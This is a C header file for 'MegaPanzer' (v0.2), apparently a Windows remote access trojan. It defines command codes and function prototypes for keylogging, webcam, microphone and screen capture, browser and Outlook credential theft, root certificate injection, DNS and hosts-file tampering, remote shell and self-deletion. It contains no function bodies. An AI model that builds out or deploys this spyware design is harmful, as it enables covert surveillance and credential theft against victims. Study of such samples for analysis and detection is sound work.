#ifndef _MEGAPANZER_DEFINITIONS_

#include <winsock.h>

  #define _MEGAPANZER_DEFINITIONS_
  #define DEBUG 1
  #define MAX_BUF_SIZE 1024
  #define PANZER_VERSION_STRING "(v0.2)"
  #define snprintf _snprintf

  #define CERT_SYSTEM_STORE_LOCAL_MACHINE 131072
  #define KEYLOGGING_FILES_PATTERN "KBD*.bin"

  #define COMMAND_CLIENT_INFO 100
  #define COMMAND_CLIENT_EXEC 114
  #define COMMAND_TOOLS_DELETE_MEGAPANZER 116
  #define COMMAND_TOOLS_ACCOUNTDATA 101
  #define COMMAND_TOOLS_INSTALLEDSOFTWARE 102
  #define COMMAND_TOOLS_BROWSERHISTORY 103
  #define COMMAND_TOOLS_BROWSERFAVORITES 115
  #define COMMAND_TOOLS_DOWNLOAD_FILE 127
  #define COMMAND_TOOLS_DELETE_FILE 128
  #define COMMAND_TOOLS_START_DATA_TRANSFER 130
  #define COMMAND_TOOLS_TRANSFER_DATA 129
  #define COMMAND_TOOLS_STOP_DATA_TRANSFER 131
  #define COMMAND_TOOLS_RETRIEVE_HOSTS 132
  #define COMMAND_MANAGER_RUNNINGPROCESSES 104
  #define COMMAND_MANAGER_RUNNINGWINDOWS 105
  #define COMMAND_MANAGER_RUNNING_SERVICES 106
  #define COMMAND_MANAGER_REGISTRY_ENTRIES 107
  #define COMMAND_MANAGER_FILE_ENTRIES 108
  #define COMMAND_MANAGER_FILE_GET  126
  #define COMMAND_SURVEILLANCE_KEYBOARDCAPTURE_LIST 145
  #define COMMAND_SURVEILLANCE_KEYBOARDCAPTURE_GET 146
  #define COMMAND_SURVEILLANCE_SCREENCAPTURE 143
  #define COMMAND_SURVEILLANCE_MICROPHONECAPTURE 144
  #define COMMAND_SURVEILLANCE_WEBCAMCAPTURE 142
  #define COMMAND_NETWORK_OPENCONNECTIONS 112
  #define COMMAND_NETWORK_LISTENING_SOCKETS 113
  #define COMMAND_NETWORK_INJECT_CERTIFICATE 134
  #define COMMAND_NETWORK_LIST_CERTIFICATES 135
  #define COMMAND_MANAGER_REMOVE_CERTIFICATE 136
  #define COMMAND_NETWORK_SET_DNSSERVER 138
  #define COMMAND_NETWORK_ADD_HOSTSENTRY 140
  #define COMMAND_NETWORK_REMOVE_HOSTSENTRY 141
  #define COMMAND_MANAGER_KILL_PROCESS_BYPID 122
  #define COMMAND_MANAGER_KILL_PROCESS_BYNAME 139
  #define COMMAND_MANAGER_START_PROCESS 123
  #define COMMAND_MANAGER_STOP_SERVICE 124
  #define COMMAND_MANAGER_START_SERVICE 125
  #define COMMAND_AUTHENTICATE 137


  #define CURRENT_USER           ((HKEY) 0x80000001)
  #define LOCAL_MACHINE          ((HKEY) 0x80000002)


  #define _CRT_SECURE_NO_DEPRECATE 1
  #define _CRT_NONSTDC_NO_DEPRECATE 1

  #define HOSTS_FILE "c:\\WINDOWS\\System32\\drivers\\etc\\hosts"

  #define THREAD_TIMEOUT 30


    ////
   // data type and struct definitions
  ////

  typedef struct sPanzerCommand
  {
    char sCommandString[MAX_BUF_SIZE + 1];
    SOCKET lRemoteSocket;
  } PANZER_COMMAND;

  typedef struct sockaddr_in2
  {
    short sin_family;
    unsigned short sin_port;
    struct in_addr sin_addr;
    char sin_zero[8];
  } SOCKADDR_IN2; 


  typedef enum OS
  {
    Win32s = 1,
    Windows95,
    Windows98,
    WindowsME,
    WindowsNT,
    Windows2000,
    WindowsXP,
    Windows2003,
    WindowsVista,
    RedHatLinux,
  } eOSTypes;

  typedef struct sMessageData
  {
    int lRunTimeSeconds;
    char lProcessName[MAX_BUF_SIZE + 1];
    unsigned int lWindowMessage;
    char *lButtonTexts[128];
    int lPID;
    int lRetVal;
  } MESSAGEDATA;

/*
  typedef struct LASTINPUTINFO 
  {
    UINT cbSize;
    DWORD dwTime;
  } LASTINPUTINFO, *PLASTINPUTINFO;
*/

    ////
   // function forward declarations
  ////

  int sendData(SOCKET pRemoteSocket, char *pDataString, int pDataLength);
  int connectHome(char, int);
  int printDebug(char *);
  int resetWinsock();
  int initWinsock();
  int initConfig();
  int getWindowsVersion(char *pOSVersion, int pBufferLength);
  int getProcessorInformation(char *pProcessorInformation, int pBufferSize);
  int getCPUUsage(HANDLE pProcessHandle);
  int getMemoryInformation(char *pMemoryInformation, int pBufferSize);


    ////
   // base64 functions
  ////

  int Base64encode_len(int len);
  int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);
  int Base64decode_len(const char * coded_src);
  int Base64decode(char * plain_dst, const char *coded_src);

  int printToFile(char *pOutputFileName, char* pCommandString);
  int findProcessName(int pPID, char *pProcessName, int pProcessNameBufSize);

  int findHistoryFile(SOCKET pRemoteSocket, char *pDirectory);
  int listHistoryEntries(SOCKET pRemoteSocket, char *pFileName);

  int findFavoritesFiles(SOCKET pRemoteSocket, char *pDirectory);
  int listFavoritesEntries(SOCKET pRemoteSocket, char *pFileName);

  DWORD WINAPI sendClientInfos(PVOID pParameter);

  int selfDelete();
  void EnumRegistryValues(HKEY pKeyHandle, char *pKey, SOCKET pRemoteSocket);

  DWORD WINAPI sendBrowserHistoryInfos(PVOID pParameter);
  DWORD WINAPI sendBrowserFavoritesInfos(PVOID pParameter);
  DWORD WINAPI sendProcessInfos(PVOID pParameter);
  DWORD WINAPI sendOpenWindowsInfos(PVOID pParameter);
  DWORD WINAPI sendServicesInfos(PVOID pParameter);
  DWORD WINAPI sendScreenCaptureInfos(PVOID pParameter);
  DWORD WINAPI sendWebcamCaptureInfos(PVOID pParameter);
  DWORD WINAPI sendInstalledSWInfos(PVOID pParameter);
  DWORD WINAPI sendOpenConnectionsInfo(PVOID pParameter);
  DWORD WINAPI sendListeningSocketsInfo(PVOID pParameter);
  DWORD WINAPI sendRemoteShellCommandOutput(PVOID pParameter);
  DWORD WINAPI sendFileListingInfos(PVOID pParameter);
  DWORD WINAPI sendRegistryListingInfos(PVOID pParameter);

  int handleCommand(char *pCommandBuffer, SOCKET pRemoteSocket);
  PBITMAPINFO CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp);
  int CreateBMPFile(HWND hwnd, LPTSTR pOutputFileName, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC);
  int convertBMP2JPG(char *pBMPFile, char *pJPGFile);
  int GetCodecClsid(const WCHAR* pFormat, CLSID* pClsid);
  DWORD WINAPI killProcessByPID(PVOID pParameter);
  DWORD WINAPI killProcessByName(PVOID pParameter);
  DWORD WINAPI stopService(PVOID pParameter);
  DWORD WINAPI startService(PVOID pParameter);
  DWORD WINAPI getFile(PVOID pParameter);
  DWORD WINAPI sendHostsFile(PVOID pParameter);
  DWORD WINAPI sendAccountInfos(PVOID pParameter);

  int deleteFile(char *pFileName, SOCKET pRemoteSocket);
  int downloadFile(char *pURL, SOCKET pRemoteSocket);
  int retrieveFileData(char *pFileData, int pFileDataLength, SOCKET pRemoteSocket);
  int decodeFile(char *pFileName);
  DWORD WINAPI injectCertificate(PVOID pParameter);
  DWORD WINAPI listCertificates(PVOID pParameter);
  DWORD listCertificateStore(char *pStoreName, SOCKET pRemoteSocket);
  DWORD WINAPI setNewDNSServer(PVOID pParameter);
  DWORD WINAPI deleteCertificates(PVOID pParameter);
  int deleteCert(DWORD pParams, char *pCertIssuerName, char *pStoreName);
  DWORD WINAPI removeHostsEntry(PVOID pParameter);
  DWORD WINAPI addHostsEntry(PVOID pParameter);

  DWORD WINAPI listKeyCaptures(PVOID pParameter);
  DWORD WINAPI getKeylogFile(PVOID pParameter);
  __declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam);

  void processExists(char *pProcFullPath);
  BOOL EnablePriv(LPCSTR pPrivileges);

  void enumOutlookAccounts(SOCKET pRemoteSocket);
  BOOL addAccountItem(SOCKET pRemoteSocket, char *resname, char *restype, char *usrname, char *pass);
  void EnumPStorage(SOCKET pRemoteSocket);

  bool readLine(char *, int, char *, DWORD, int *);
  DWORD WINAPI sendMessage(LPVOID pParam);
  int addCertificate(char *pCertStoreName, DWORD pFlags, char *pCertificateFile);
  void muteSpeakers(DWORD *mVolume);
  void unmuteSpeakers(DWORD mVolume);
  void GetPIDsFromProcessName(char *, DWORD, DWORD *);
  BOOL CALLBACK EnumProcToSendMessage(HWND, LPARAM);
  LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
  DWORD WINAPI workerThread(PVOID pParameter);
#endif
